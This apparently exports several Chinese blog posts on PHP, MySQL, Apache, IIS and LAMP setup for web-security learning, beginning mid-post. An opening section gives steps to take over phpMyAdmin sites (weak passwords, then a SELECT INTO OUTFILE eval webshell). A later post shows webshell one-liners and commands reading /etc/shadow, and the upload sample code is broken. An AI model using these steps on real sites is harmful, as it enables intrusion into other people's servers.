GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。永久解决办法： 修改配置文件my.ini，添加如下语句： secure_file_priv= //表示可导入导出到任意目录 临时解决办法： set global secure_file_priv=&apos;&apos;; 第二种方法 12345mysqldump -uroot -p db_name &gt; ./db_name.sql 在DOS命令下运行mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名 彩蛋 通过phpmyadmin来getshell12345671. 首先通过google hacking找到phpmyadmin的网站2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件3. 执行SQL语句，查看数据库所在位置：select @@basedir;4. 猜测根目录写入木马文件：`select &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html` 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP文件包含、cookie、文件上传]]></title>
    <url>%2F2018%2F12%2F18%2FPHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81cookie%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[PHP文件包含、cookie、文件上传一、文件包含在 PHP 中，可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。 include 和 require 语句用于在执行流中插入写在其他文件中的有用的代码。 两者之间的区别在于： include生成一个警告，在错误发生后依然会执行。 require生成一个致命错误，在错误发生时就会停止执行。 123include &apos;head.php&apos;; include会在PHP文件开始运行的时候包含require &apos;tail.php&apos;; require会在PHP文件运行到require关键字时包含 include_once和require_once表示只包含一次 123include_once &apos;head.php&apos;;require_once &apos;tail.php&apos;; 二、cookie和session2.1cookiecookie 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。 setcookie()函数用来设置cookie 注意：setcookie()函数必须位于&lt;html&gt;标签之前。 创建一个名为 “user” 的 cookie，并为它赋值 “runoob”。并规定了此 cookie 在一小时后过期： 123&lt;?phpsetcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);?&gt; 2.1.1取回cookie值$_COOKIE 变量用于取回 cookie 的值。 取回名为 “user” 的 cookie 的值，并把它显示在了页面上： 1234567&lt;?php// 输出 cookie 值echo $_COOKIE[&quot;user&quot;];// 查看所有 cookieprint_r($_COOKIE);?&gt; 2.1.2删除cookie删除cookie很简单，只要将日期改为过去的时间点。 1234&lt;?php// 设置 cookie 过期时间为过去 1 小时setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);?&gt; 2.2sessionSession 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。 在把用户信息存储到 PHP session 中之前，首先必须启动会话。 注意：session_start() 函数必须位于&lt;html&gt; 标签之前： 1234567&lt;?php session_start(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt; 2.2.1存储session存储和取回 session 变量的方法是使用 PHP $_SESSION 变量： 12345678910&lt;?phpsession_start();// 存储 session 数据$_SESSION[&apos;views&apos;]=1;?&gt;&lt;?php// 检索 session 数据echo &quot;检索&quot;. $_SESSION[&apos;views&apos;];?&gt; 2.2.2删除session删除session数据，可以使用 session_destroy() 函数。 session_destroy() 函数是彻底销毁 session 123&lt;?phpsession_destroy();?&gt; 三、文件上传PHP可以把文件上传到服务器中。 文件上传的HTML表单，代码会在查看页面时出现上传界面 1234&lt;from&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/from&gt; 在PHP中可以写上传文件的代码 在这里限制了只能上传jpg和png格式的文件如果上传的文件与规定上传的文件格式不匹配，是不允许上传的。 在上传后，文件将会存储在用户指定的文件夹 12345678910111213141516&lt;?php$ext_arr = array(&apos;jpg&apos;, &apos;png&apos;); if (isset($_FILES[&apos;file&apos;]))&#123; if ($_FILES[&apos;file&apos;] [&apos;error&apos;] == 0 )&#123; if (in_array($filename, $ext_arr) === false) &#123; echo &quot;上传文件扩展名是不允许的扩展名。&quot;; &#125;else &#123; $ok = move_uploaded_file($_FILES[&apos;file&apos;] [&apos;tmp_name&apos;], &apos;./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;name&apos;]); if ($ok) &#123; echo &apos;文件保存在: ./picture/&apos; . $_FILES[&apos;file&apos;] [&apos;tmp_name&apos;]; &#125; else &#123; echo &apos;文件上传失败&apos;; &#125; &#125;?&gt; 在文件夹中的存储方式是： 12345678910111213&lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)&#123; echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;&#125;else&#123; echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;; echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;; echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;; echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#125;?&gt; 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>php,文件包含,cookie,session,文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php表单+文件+代码、命令执行]]></title>
    <url>%2F2018%2F12%2F17%2Fphp%E8%A1%A8%E5%8D%95%2B%E6%96%87%E4%BB%B6%2B%E4%BB%A3%E7%A0%81%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[表单处理 三种接收表单数据的方式$_GET、$_POST、$_REQUEST 特性： 超全局变量 都是数组 121. $_GET 此方式接收表单的method=&apos;get&apos;方式传递的值 122. $_POST 此方式接收表单的method=&apos;post&apos;方式传递的值 123. $_REQUEST 此方式接收表单get/post方式传递的值 超全局变量$_SERVER：用于收集客户端请求信息 1234567$_SERVER[&apos;SERVER_ADDR&apos;] 返回当前运行脚本所在的服务器的IP地址$_SERVER[&apos;REMOTE_ADDR&apos;] 返回浏览当前页面的用户的IP地址$_SERVER[&apos;SERVER_NAME&apos;] 服务器主机名$_SERVER[&apos;REMOTE_HOST&apos;] 用户的主机名$_SERVER[&apos;REMOTE_PORT&apos;] 用户连接到服务器的端口号$_SERVER[&apos;HTTP_HOST&apos;] 返回来自当前请求的Host头$_SERVER[&apos;HTTP_REFERER&apos;] 来源IP地址（从哪个IP地址跳转过来的） 文件操作 fopen()：打开文件 1fopen(文件名,打开文件的方式); 打开文件常用的方式： r：只读方式打开，指针位置在文件开头 r+：读写方式打开，指针位置在文件开头 w：写入方式打开，清空文件内容，如果文件不存在则创建 w+：读写方式打开，清空文件内容，如果文件不存在则创建 a：追加，打开并向文件末尾进行写操作，如果文件不存在则创建 a+：可读并追加。通过向文件末尾写内容，来保持文件内容 x：只写，创建新文件。如果文件已存在，则返回FALSE和一个错误 x+：读写，创建新文件。如果文件已存在，则返回FALSE和一个错误 fgets()：逐行读取文件，每次只读取一行 1fgets(文件名); fread()：按长度读取文件的内容 1fread(文件名，长度); 换行也算一个长度 fwrite()：写入文件 1fwrite(文件名，内容); fputs：fwrite()的别名 fclose()：关闭一个打开的文件 1fclose(文件名); feof()：检测指针是否已到达文件末尾 可以结合while循环来读取文件中所有的内容 123456$file = fopen(&apos;a.txt&apos;,&apos;r&apos;);while(!feof($file)) //如果达到末尾，会返回TRUE&#123; echo fgets($file);&#125;fclose($file); unlink()：删除文件 opendir()：打开文件夹 1$file = opendir(目录); readdir()：读取文件夹（从目录句柄中读取条目） 1readdir($file); closedir()：关闭文件夹 1closedir($file); file_exists()：检查文件或目录是否存在 copy()：复制文件 1copy(源文件名,复制后的文件名); 可以移动的同时重命名文件 rename()：重命名文件或目录 1rename(源文件名,新文件名); file_get_contents()：把整个文件读入一个字符串中 1file_get_contents(文件[,include_path,context,start,max_length]) file_put_contents：把一个字符串写入文件中 1file_put_contents(string $filename,$data) 用文件操作写一句话： 1&lt;?php fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[&apos;cmd&apos;]);?&gt;&apos;);?&gt; 代码执行 eval() 123函数里可以使用单引号或者双引号使用单引号：变量不转义使用双引号：变量被转义 assert() preg_replace()：正则里面使用/e模式 1@preg_replace(&quot;/abc/e&quot;,$_REQUEST[&apos;cmd&apos;],&quot;abcd&quot;); create_function()：创建函数 1$func = create_function(&apos;&apos;,$_REQUEST[&apos;cmd&apos;]); $func(); $_GET[&#39;a&#39;]($_GET[&#39;b&#39;])：动态创建函数 12要求：PHP版本5.2以下才可以使用在地址栏中使用：a=assert&amp;b=phpinfo() 即可打印PHPinfo 命令执行 exec()：使用它必须在第二个参数指定一个变量来接收执行的命令 12exec(&quot;cat /etc/shadow&quot;,$output);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; system()：命令会直接执行，无需变量接收 1system(&quot;phpinfo()&quot;); popen()：此函数是打开一个进程，可读取此进程的结果 123$file = popen(&quot;cat /etc/shadow&quot;,&apos;r&apos;);echo fread($file,5000);pclose($file); shell_exec()：此函数需要一个变量在外接收它的结果并输出 12$output = shell_exec(&apos;ls -al&apos;);echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;; 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>php,表单处理,文件,代码执行,命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[apache配置和虚拟主机]]></title>
    <url>%2F2018%2F12%2F14%2Fapache%E9%85%8D%E7%BD%AE%E5%92%8C%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%2F</url>
    <content type="text"><![CDATA[Apache配置 Apache主配置文件名：httpd.conf 每次修改完必须重启服务才能生效 检查Apache主程序是否有语法错误： 1在命令行中，输入：httpd.exe -t 前提是配置好环境变量或者在主程序目录中执行 DocumentRoot：网站根目录 12DocumentRoot &quot;E:\WWW&quot;路径不能有中文，空格 DirectoryIndex：网站默认首页文件 12DirectoryIndex index.html index.php如果不指定的话，会显示目录列表，如果禁止显示，则什么都没有 Listen：当Apache启动后，会等待请求的进入，监听本机指定IP地址和端口的访问，就像酒店的迎宾员，你去不去，他都在门口等着你。。。 12345语法：Listen [IP][:端口号]如： Listen 80 监听本机的所有IP地址的80端口的请求 Listen 192.168.3.100 监听本机的指定IP地址的所有端口的访问 Listen 192.168.3.100:80 监听本机的指定IP地址的80端口的访问 &lt;Directory&gt;&lt;/Directory&gt;：设置网站根目录的客户端访问权限 123456789语法： 1.指定网站根目录：DocumentRoot &quot;E:\WWW&quot; 2.给网站根目录指定访问权限 &lt;Directory &quot;E:\WWW&quot;&gt; Options 如果首页文件不存在，是否显示列表 Order 指定Deny(禁止)和Allow(允许)的执行顺序 Deny 禁止哪些外部IP访问你的主机 Allow 允许哪些外部IP访问你的主机 &lt;/Directory&gt; 12345678910111213141516参数说明： Options：指定服务器将启用哪些服务器特性。取值：None、All、Indexes None：禁止启用服务器特性(啥也看不见) All：开启所有服务器特性 Indexes：如果首页文件不存在，则显示目录列表 +Indexes：显示 -Indexes：不显示 Order：指定Allow和Deny的执行顺序 Order Allow,Deny 先允许访问，在禁止指定IP访问(黑名单) Order Deny,Allow 先禁止所有访问，再指定IP访问(白名单) Deny：禁止哪些IP访问你的主机 Deny from all 禁止所有IP访问你的主机，包括自己 Deny from 192.168.3.123 禁止指定IP访问你的主机 Deny from 192.168.3.123 192.168.3.133 同时禁止两个外部IP访问你的主机 Deny from 192.168.3 禁止192.168.3.0到192.168.3.255之间所有IP访问 Allow：允许哪些IP访问你的主机 如果输入域名/IP后显示Forbidden，被禁止了，就先找默认首页文件，然后再找目录列表 ServerName：本地域名 1ServerName localhost 虚拟主机 概念：将一台真实的主机划分成若干个”小空间”，对外”出租”，每一个”小空间”都具有网站的完整功能 我们配置的虚拟主机，是基于域名的虚拟主机，即，一个IP地址，可以绑定多个域名 NameVirtualHost：创建基于域名的虚拟主机的命令。换句话说：就是哪些IP地址可以访问定义的虚拟主机。该命令一般放在Apache的主配置文件中httpd.conf 123如果要配置基于域名的虚拟主机，以下两项必须开启NameVirtualHost *:80Include conf/vhosts.conf 1include用来包含一个文件，也就是说创建虚拟主机的工作就在vhosts.conf这个文件中完成 配置步骤： 配置本地的DNS文件——hosts 文件路径：C:\Windows\System32\drivers\etc\hosts 12我来配置这个域名：127.0.0.1 www.hai.com 配置Apache的主配置文件——httpd.conf 文件路径：..\conf\httpd.conf 监听自己的网卡的哪个IP地址的哪个端口的访问 1Listen 80 以下指定哪些IP地址和端口可以访问虚拟主机，其中，IP地址必须是自己的网卡的IP地址 12NameVirtualHost *:80Include conf/vhosts.conf 配置Apache的虚拟主机——vhosts.conf 文件路径：..\conf\vhosts.conf 123456789101112131415#配置www.hai.com&lt;VirtualHost *:80&gt; #给虚拟主机指定域名(注释只能单起一行) ServerName www.hai.com #指定默认首页，如果不指定，将继承全局配置；如果指定，将覆盖全局配置 DirectoryIndex abc.html #指定网站根目录 DocumentRoot &quot;E:\WWW\web1&quot; #配置目录权限 &lt;Directory &quot;E:\WWW\web1&quot;&gt; Options +Indexes Order Deny,Allow Allow from all &lt;/Directory&gt;&lt;/VirtualHost&gt; 为什么配置完虚拟主机，localhost不能用了 1配置完虚拟主机后，第一个虚拟主机的优先级最高，比全局中的配置还要高。因此，访问localhost时，就指向了第一个虚拟主机 123456所以，要配置localhost的虚拟主机，并放在第一个#配置localhost&lt;VirtualHost *:80&gt; ServerName localhost DocumentRoot &quot;E:\WWW&quot;&lt;/VirtualHost&gt;]]></content>
      <tags>
        <tag>apache,配置,虚拟主机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php(以漏洞层面出发)]]></title>
    <url>%2F2018%2F12%2F13%2FPHP%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93(%E4%BB%A5%E6%BC%8F%E6%B4%9E%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91)%2F</url>
    <content type="text"><![CDATA[HTML + CSS常用标签12345678910111213141516&lt;a href=&apos;&apos;&gt;&lt;/a&gt;&lt;img src=&apos;&apos;&gt;&lt;from action=&apos;&apos; method=&apos;&apos;&gt; &lt;input type=&apos;&apos; name=&apos;&apos; value=&apos;&apos;&gt;&lt;/from&gt;&lt;table border=&quot;1&quot;&gt;&lt;tr&gt; &lt;th&gt;Month&lt;/th&gt; &lt;th&gt;Savings&lt;/th&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;January&lt;/td&gt; &lt;td&gt;$100&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; a img form三个标签必须掌握，了解href,src。针对于form标签，了解action,method,type,name,value. 特别是了解input中的name在PHP中的使用。 JavaScript工具 熟练使用开发者工具 元素审查 控制台 代码 页面中加载js代码的方式（script标签直接写，使用事件调用，script使用src加载） 学会在js中定义变量 在js中使用数组 在js中调用函数 在整个html页面中，所有加载的代码，是一个整体。事件中、标签中、src文件中的代码是一个整体，可以在这三个位置使用其他位置的变量函数等。 事件 常用的事件 事件中可以直接执行代码 事件可以调用函数 利用错误的img或其他的标签，调用onerror事件，然后加载远程的js文件，控制浏览器（在之后的xss漏洞中会用到，可以先行了解）。 DOM js使用dom获取一个标签元素 js使用dom修改一个标签元素 js使用dom添加一个标签元素（学会发送get/post请求） Window location中几个url参数 document.cookie（自行了解） PHP别忘了之前学的搭建lamp环境以及wamp环境PHP适合html结合在一起使用的。 使用PHP动态的生成html页面 PHP标签的使用以及嵌入 PHP文件的后缀意义（很重要，在之后学习上传漏洞时会用到） apache默认只解析.php，.phtml文件后缀，可在Apache的配置文件httpd.conf中搜索addtype进行更改 基础语法 代码规范 变量以及常量 数据类型 输入（重点了解 $_GET $_POST $_SERVER $_REQUEST） 输出（echo var_dump） 各种运算符 数组（类型，数组操作添加输出元素，foreach输出元素） 字符串常用函数（count,strlen,str_split,chr,md5,htmlentities,addslashes,trim,strcmp） 条件控制（if(){}else{}, switch(){case:break;}） 循环控制（for,foreach,while,do while） 函数（创建,传参，获取结果） 对象（能够看懂，可以自行深究） 表单操作 $_GET $_POST $_SERVER $_REQUEST 文件操作（漏洞任意文件读取） fopen打开文件 fwrite写文件 unlink删除文件 读写模式 file_get_contents file_put_content 可以使用PHP伪协议进行读文件（附加）以及任意文件读取（目录跳跃） 命令执行以及代码执行（漏洞代码命令执行） system eval 文件包含（漏洞任意文件包含） include require 文件上传（漏洞文件上传） $_FILES 获取文件内容 获取文件信息 处理上传的文件 Cookie和Session（漏洞cookie伪造） setcookie _COOKIE session_start $_SESSION session_destroy 数据库操作（漏洞注入）Mysql + PHP 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php(以代码层面出发)]]></title>
    <url>%2F2018%2F12%2F13%2Fphp(%E4%BB%A5%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91)%2F</url>
    <content type="text"><![CDATA[语言基础 php文件的后缀名：.php php区分大小写，关键字和函数名不区分大小写 php所有代码不会在前端显示 注释： 单行注释：//或# 多行注释：/* 注释内容 */ 变量 变量： 可以包含字母，数字，下划线 以$开始 不能以数字开头 {}：可以包住变量，如{$a}，用途：可在变量后紧跟其他内容，无需空格 赋值传值和引用传值 赋值传值： $a = 1; ​ $b = $a; ​ $a = 2; 重新给$a赋值 ​ echo $b; $b的值不变，还是1 引用传值： $a = 1; ​ $b = &amp;$a; ​ $a = 2; ​ echo $b; 结果为2 数据类型 数据类型： 标量数据类型：整形int，浮点型float，布尔型bool，字符型string 布尔型bool(false)有哪些：false ，整形0， 浮点型0.0， 空字符串“”， 字符串“0”， 空数组， null，其余全是bool(true) 整形int：可以用十进制、八进制(0开头)、十六进制(0x开头)进行赋值 字符型string：在单引号&#39;&#39;里变量不会被解析 复合数据类型：数组array，对象object 特殊数据类型：资源resource，空null null：这些情况被认为null：被赋值为null， 尚未赋值 ，被unset() 判断数据类型 var_dump() 在UTF-8编码下，一个汉字用3个字节表示；在GBK下，一个汉字用2个字节表示 通过is函数判断数据类型 is_bool()，is_float()，is_int()，is_numeric()等等 EOF：处理长字符串 以&lt;&lt;&lt;EOF开始，EOF结束 “EOF”可以自定义名称，叫什么都可以 EOF表示字符串的结束，必须放在行首，不能缩进，单独一行 在EOF中，特殊字符不需要转义 反斜杠\：用来转义被程序语法结构占用了的特殊字符 检查变量是否设置 isset()函数 empty()函数 强制数据类型转换：在变量前加上英文小括号并写入要转换的数据类型，如：(bool)$a，(int)$a 其它类型转成字符串，有以下规则： 布尔值true转为字符串1，false转为字符串&quot;&quot;（空字符串） 整数或浮点数转换成数值型的字符串 数组将被转换成字符串&quot;array&quot; null将被转换成空字符串 其它类型转成整形或浮点型，有以下规则： 布尔值false转成0，true转成1 浮点数转成整形，数字被取整（小数位被丢弃） 如果字符串以合法的数字开头，这个数字可直接转成数值；否则，被转成0 常量 常量 不要在常量前加美元符号$ 定义：define(name,value[,flag]) name：变量名 value：变量值 flag：可选项，规定常量名是否对大小写敏感。true敏感，false不敏感 系统常量 __FILE__：PHP程序文件名 __LINE__：PHP程序当前行号 PHP_VERSION：PHP程序版本号 PHP_OS：操作系统名称 TRUE：真值 FALSE：假值 NULL：一个null值 E_ERROR：这个常量指到最近的错误处 E_WARNING：这个常量指到最近的警告处 E_PARSE：这个常量指到解析语法有潜在问题处 E_NOTICE：这个常量为发生不寻常但不一定是错误处 运算符算数运算符，逻辑运算符，比较运算符，赋值运算符，字符串运算符，条件运算符 算术运算符：+，-，*，/，%，++，-- 字符串运算符：.，.= 赋值运算符：=，-=，+=，*=，/=，%= 比较运算符：&gt;，&lt;，&gt;=，&lt;=，==，===，!=，!==，&lt;&gt; 逻辑运算符：and(&amp;&amp;)，or(||)，not(!) 条件运算符：?: 流程控制 if条件判断 if(){} if(){}else{} if(){}elseif(){}else… while循环：先判断，后循环 ​ $i = 0; ​ while($i&lt;100){ ​ echo $i; ​ } do while循环：先循环一次，在进行判断 ​ $i = 0; ​ do{ ​ echo $i; ​ }while($i&gt;100) switch分支语句：通过一个条件来选择要执行的代码 ​ switch(参数或表达式){ ​ case 值1: ​ code1; ​ break; ​ default: ​ code; ​ break; ​ } for循环 for(初始化;条件判断;条件更新){ ​ 循环体语句块; } break语句：无条件结束循环，使程序跳转到大括号之后，break可接受参数来决定跳出几层循环，默认只跳出当前循环 continue语句：结束本次循环，也可接受一个参数，来决定跳出几重循环 数组 分类 索引数组：下标为整数的数组 关联数组：下标为字符串的数组 多维数组：数组的一个或多个元素是数组 创建数组 使用数组标识符[]来创建数组： 语法：$arr[key] = value; 使用array函数来创建： 语法：$arr = array([key=&gt;]value,…); unset()函数：删除数组元素 只删除元素，但保留其结构 解析： $arr = [1,2,3,4,5]; ​ foreach($arr as $i=&gt;$value){unset($arr[$i]);} ​ $arr[] = 100; 此时，值为100的键名为5 foreach()函数：（只能）遍历数组 语法：1. foreach($arr as $value){`code;`} 2. foreach($arr as $key =&gt; $value){`code;`} 其他一些数组操作函数：count()，array_shift，array_pop()，array_reverse，array_flip()…… PHP全局数组 $_SERVER $_SERVER[‘SERVER_ADDR’]：服务器IP地址 $_SERVER[‘REMOTE-ADDR’]：客户端IP地址 $_SERVER[‘SERVER_NAME’]：服务器域名称 $_GET $_POST $_FILES $_REQUEST $_SESSION 函数 必须由function关键字开头来定义一个函数 函数名的命名规则和变量一样，函数名不能以$开头 函数名后紧跟括号()，()中包含参数，参数是函数将从调用者处获得的值，参数可有可无，数量根据需要而定 函数代码块在定义时不会执行，只有在被调用时才执行 可以使用return返回值 参数： 值传递：正常的写法 引用传递：在参数前加上&amp; 解析： $arr = array(1,2,3,4); ​ function addElement(&amp;$arr){ ​ $arr[count($arr)] = 100; ​ print_r($arr); //在函数内输出$arr ​ } ​ addElement($arr); ​ print_r($arr); //在函数外输出$arr 默认值传递：传递一个默认的值，在调用是可以根据情况指定或不指定 解析： function func1($who,$animal = ‘猪’){ ​ echo “$who 是 $animal”; ​ } ​ func1(‘老鹰’，‘鸟’)； ​ func1(‘你’)； 过于真实，举报了！ 函数变量的作用域：在PHP中，函数外部与内部的变量不能通用，必须在声明变量时加上global关键字才可以 global关键字只能在函数内使用 不能在声明变量的同时赋值 内置函数 include：如果指定文件有错，则报警告并继续执行 require：如果指定文件有错，则报致命错误并终止运行 PHP内置了各种函数，比如： 日期和时间函数 数学函数 HTTP函数 URL函数 字符串操作函数 等等…… 对象 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rpm安装php]]></title>
    <url>%2F2018%2F12%2F07%2Frpm%E5%AE%89%E8%A3%85php%2F</url>
    <content type="text"><![CDATA[本文可能有点乱，右边有个目录，看着那个来就行了 本文讲述linux（centos7）使用rpm安装php的过程rpm安装软件的命令是这样的：rpm -ivh 软件名 -i –install,安装 -v –verbose,详细过程 -h –hash,显示进度信息 过程中会遇到依赖包的问题，一个一个解决掉就完事儿了！ 开始安装解压php.rat.gz进入packages目录中，有5个文件，都是安装包，这篇文章主线就是安装这五个包，随便执行一个瞅瞅 安装httpd…这个错误中说明安装此程序需要四个依赖，不过其中有一个依赖（http-tools...）在我解压php.tar.gz的时候里面有，所以，可以先安装那个试一试 ①安装httpd-tools…缺少这两个依赖包，去镜像站下载，我这里用的华为的镜像站，下载好，传到虚拟机里面来，如下： 安装apr…成功！ 安装apr-util…：成功！ 注：如果安装这两个顺序反了，可能会出错，不过也没啥，可能错误就是apr-util被apr依赖，那你先安装apr就ojbk了 继续安装httpd-tools…成功！ ②安装httpd…这里有个坑！在镜像站里面是找不到/etc/mime.types这个货的，像这种错误信息里给出的名字和安装包的名字不一样的恶心情况，有两种解决办法： 使用yum安装httpd，然后查看安装过程，找到/etc/mime.types，看紧跟着它下面要安装的包的名字，就是我们要找的玩意儿 Google一下，你全知道所以我是Google出来看到别的大佬用的第一种方法找到然后分享的，然后我就直接去镜像站找了这个货，传进虚拟机，装它 安装mailcap…成功！！ 继续安装httpd…成功！ 安装php…这里说明一点，这三个包是相互依赖的关系，不管你先装哪个，最后出错了，还是要按照这个顺序来，所以我就直接按照这个正确的顺序来装了： ③安装php-common…缺少这个玩意儿，去镜像站下载，传过来，装它： 安装libzip…成功！ 继续安装php-common…成功！ ④安装php-cli…这里！这里！是最恶心的一个地方！首先，找不到libcrypto这个玩意儿，然后发现这个是openssl的扩展还是依赖，就是最后发现是因为openssl的版本过低，然后去更新版本，如果通过rpm来装，好像有三十多个依赖包，我崩溃了。所以我选择用yum来装，yum大法好！！ yum安装openssl成功！ 继续安装php-cli…成功！ ⑤安装php…大功告成！！！！！！ 查看是否安装成功查看PHP版本即可： 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>rpm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows搭建IIS]]></title>
    <url>%2F2018%2F12%2F06%2Fwindows%E6%90%AD%E5%BB%BAiis%2F</url>
    <content type="text"><![CDATA[本次使用的虚拟机是Windows Server 2008 R2，我要在上面搭建iis服务，并运行一个asp的网站。 前提：需要以下两个文件： .net framework 4.7.2 一个asp的网站源码 操作步骤如下： 安装IIS之后再次点击下一步好无聊，iis装完了！照我这样选，基本的东西都有！ 配置IIS 删除默认网站和应用池 添加网站然后导入网站数据 改权限 改权限是为了能对网站进行各种操作 启用父路径False改为True 更改默认首页这里去看下载的网站的源码，默认首页是什么格式的这里就怎么写 启用32位程序 选择.net 4版本由于我事前并没有安装，所以无法修改，所以这里没有截图，操作步骤同上，在选择高级设置的时候，这回选择基本设置，就可以在里面修改了。 如果本文有任何错误，欢迎留言给我：Contact Me！]]></content>
      <tags>
        <tag>windows,iis,搭建,asp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LAMP环境搭建与配置]]></title>
    <url>%2F2018%2F12%2F05%2FLAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[说明本次搭建用的是centos6的虚拟机，是大佬直接传给我的虚拟机，所有就存在了一个问题，克隆的虚拟机会出现网卡找不到的情况解决方法就是: 执行命令： cat /etc/udev/rules.d/70-persistent-net.rules 查看里面最下面的网卡名称和MAC地址 然后打开网卡配置信息并修改 vi /etc/sysconfig/network-scripts/ifcfg-eth0 然后重启网卡就可以了，执行命令： service network restart 现在我们开始安装LAMP！ 搭建LAMPLAMP=LINUX+APACHE+MYSQL+PHP 这是在Linux下最常见的提供web服务的组合之一 Linux 是免费开源软件，这意味着源代码可用的操作系统 Apache 是使用中最受欢迎的一个开放源码的WEB服务器软件 MySQL 是多线程、多用户的SQL数据库管理系统 PHP 是一种编程语言最初设计生产动态网站。PHP 是主要用于服务器端的应用程序软件 接下来我们开始安装，为了方便，我们直接使用yum来安装 安装Apache 执行命令： yum install httpd httpd-devel httpd-manual mod_ssl mod_perl mod_auth_mysql 装完之后，在启动前，需要解决一个错误：首先验证你有没有这个错误，直接执行命令httpd看是否和上面错误一样，如果一样，那我们就来解决它 我们先停止httpd服务，执行命令service httpd stop,打开httpd.conf配置文件，修改ServcerName，使域名生效，所以我们来执行命令： vi /etc/httpd/conf/httpd.conf /exam :为了更快速的找到servername 把#去掉，完事儿 启动httpd： service httpd start 这个时候去使用ip访问时访问不了的，因为防火墙有拦截，防火墙这么做，是为了防止网站受到攻击，之前我们直接关闭了防火墙去做访问，但是这样很不安全，所以我们就需要修改防火墙的规则来在防火墙开启的状态下又能正常访问 修改防火墙规则在centos6中，防火墙规则是放在一个文件中的，centos7中是通过命令修改的，这是不一样的地方打开防火墙规则文件，修改就完事儿了 vi /etc/sysconfig/iptables 在里面我们需要加入一条规则： -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT 这里要说明两点： 这条命令要加在这条命令：之前，因为这条命令拒绝所有数据包访问，而防火墙规则是从上到下执行的，我们需要写在这条命令前面才能生效 解释一下这条命令：-A：追加规则，-INPUT：别人请求你，-p：指定协议类型，-m：启用扩展功能，--dport：-p的扩展，指定端口，-j：指定这条规则如何进行处理，ACCEPT表示通过 之后重启防火墙即可 service iptables restart 成功访问：设置开机自启： chkconfig httpd on 安装MySQL 执行命令： yum install mysql mysql-server mysql-devel 至此MySQL就安装完成 启动MySQL service mysqld start 初始化MySQL mysql_secure_installation 在这里需要设置MySQL数据库密码：之后一路回车就完事儿了设置开机自启： chkconfig mysqld on 至此MySQL就安装完成了！ 安装PHPyum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml php安装完成由于PHP是Apache的扩展，所以安装完PHP后需要重启Apache服务： service httpd restart 至此，LAMP环境安装完成 搭建网站 我们来导入网站源码测试一下，这次我们搭建一个漏洞环境，通过小黄鸭将文件导入/var/www/html目录中： 修改文件夹权限，避免出现权限问题： chown -R apache:apache /var/www/html 打开配置文件 vi 